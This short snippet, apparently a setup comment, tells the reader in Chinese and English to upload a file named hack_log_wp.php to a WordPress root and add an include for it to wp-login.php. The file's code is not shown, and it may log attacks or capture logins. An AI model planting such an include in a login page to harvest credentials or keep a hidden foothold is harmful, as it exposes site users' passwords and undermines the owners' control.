//把hack_log_wp.php上传到Wordpress的根目录，然后修改wp-login.php，添加下面这一行
//put the hack_log_wp.php into the root directory of wordpress, and modify wp-login.php, add this code:

include_once dirname(__FILE__) . '/hack_log_wp.php';